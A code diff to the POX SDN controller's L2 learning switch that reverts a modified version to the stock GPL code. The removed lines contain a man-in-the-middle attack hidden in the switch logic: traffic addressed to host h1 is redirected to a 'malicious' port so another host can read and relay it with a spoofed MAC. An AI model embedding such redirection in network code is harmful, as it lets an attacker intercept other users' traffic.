@@ -1,16 +1,32 @@
-# this code works on a network with a single switch (e.g. star topology)
-# It redirects any packets sent to h1 to h2. In an attack scenario,
-# h2 could reead the contents of the pakcet and then then send it out
-# to h1 while spoofing sourcee MAC address of the original sender
-# this is all baked into a normal learning switch application 
+# Copyright 2011 James McCauley
+#
+# This file is part of POX.
+#
+# POX is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# POX is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with POX.  If not, see <http://www.gnu.org/licenses/>.
 
+"""
+An L2 learning switch.
+It is derived from one written live for an SDN crash course.
+It is somwhat similar to NOX's pyswitch in that it installs
+exact-match rules for each flow.
+"""
 
+from pox.core import core
 import pox.openflow.libopenflow_01 as of
-from pox.lib.util import dpid_to_str, str_to_dpid
+from pox.lib.util import dpid_to_str
 from pox.lib.util import str_to_bool
 import time
-from pox.lib.revent import *
-from pox.lib.addresses import EthAddr
 
 log = core.getLogger()
 
@@ -78,6 +94,7 @@ class LearningSwitch (object):
     """
 
     packet = event.parsed
+    log.debug("Switch dpid: %s", dpid_to_str(event.dpid))
 
     def flood (message = None):
       """ Floods the packet """
@@ -132,68 +149,43 @@ class LearningSwitch (object):
 
     if packet.dst.is_multicast:
       flood() # 3a
-    
     else:
-        h1_mac = EthAddr('00:00:00:00:00:01')
-        mal_port = 2
-        if (packet.dst == h1_mac):
-          log.debug("installing attack flow for %s.%i -> %s.%i" %
-          (packet.src, event.port, packet.dst, mal_port))
-          msg = of.ofp_flow_mod()
-          #msg.priority = 42
-          #msg.match.dl_type = 0x800
-          msg.match.dl_dst = h1_mac
-          # msg.match.tp_dst = 80
-          msg.actions.append(of.ofp_action_output(port = mal_port))
-          self.connection.send(msg)
-
-        else:
-          if packet.dst not in self.macToPort: # 4
-            flood("Port for %s unknown -- flooding" % (packet.dst,)) # 4a
-          else:
-            port = self.macToPort[packet.dst]
-            if port == event.port: # 5
-              # 5a
-              log.warning("Same port for packet from %s -> %s on %s.%s.  Drop."
-                  % (packet.src, packet.dst, dpid_to_str(event.dpid), port))
-              drop(10)
-              return
-            # 6            
-          
-            log.debug("installing flow for %s.%i -> %s.%i" %
-                      (packet.src, event.port, packet.dst, port))
-            msg = of.ofp_flow_mod()
-            msg.match = of.ofp_match.from_packet(packet, event.port)
-            msg.idle_timeout = 10
-            msg.hard_timeout = 30
-            msg.actions.append(of.ofp_action_output(port = port))
-            msg.data = event.ofp # 6a
-            self.connection.send(msg)
+      if packet.dst not in self.macToPort: # 4
+        flood("Port for %s unknown -- flooding" % (packet.dst,)) # 4a
+      else:
+        port = self.macToPort[packet.dst]
+        if port == event.port: # 5
+          # 5a
+          log.warning("Same port for packet from %s -> %s on %s.%s.  Drop."
+              % (packet.src, packet.dst, dpid_to_str(event.dpid), port))
+          drop(10)
+          return
+        # 6
+        log.debug("installing flow for %s.%i -> %s.%i" %
+                  (packet.src, event.port, packet.dst, port))
+        msg = of.ofp_flow_mod()
+        msg.match = of.ofp_match.from_packet(packet, event.port)
+        msg.idle_timeout = 10
+        msg.hard_timeout = 30
+        msg.actions.append(of.ofp_action_output(port = port))
+        msg.data = event.ofp # 6a
+        self.connection.send(msg)
 
 
 class l2_learning (object):
   """
   Waits for OpenFlow switches to connect and makes them learning switches.
   """
-  def __init__ (self, transparent, ignore = None):
-    """
-    Initialize
-    See LearningSwitch for meaning of 'transparent'
-    'ignore' is an optional list/set of DPIDs to ignore
-    """
+  def __init__ (self, transparent):
     core.openflow.addListeners(self)
     self.transparent = transparent
-    self.ignore = set(ignore) if ignore else ()
 
   def _handle_ConnectionUp (self, event):
-    if event.dpid in self.ignore:
-      log.debug("Ignoring connection %s" % (event.connection,))
-      return
     log.debug("Connection %s" % (event.connection,))
     LearningSwitch(event.connection, self.transparent)
 
 
-def launch (transparent=False, hold_down=_flood_delay, ignore = None):
+def launch (transparent=False, hold_down=_flood_delay):
   """
   Starts an L2 learning switch.
   """
@@ -204,8 +196,4 @@ def launch (transparent=False, hold_down=_flood_delay, ignore = None):
   except:
     raise RuntimeError("Expected hold-down to be a number")
 
-  if ignore:
-    ignore = ignore.replace(',', ' ').split()
-    ignore = set(str_to_dpid(dpid) for dpid in ignore)
-
-  core.registerNew(l2_learning, str_to_bool(transparent), ignore)
+  core.registerNew(l2_learning, str_to_bool(transparent))
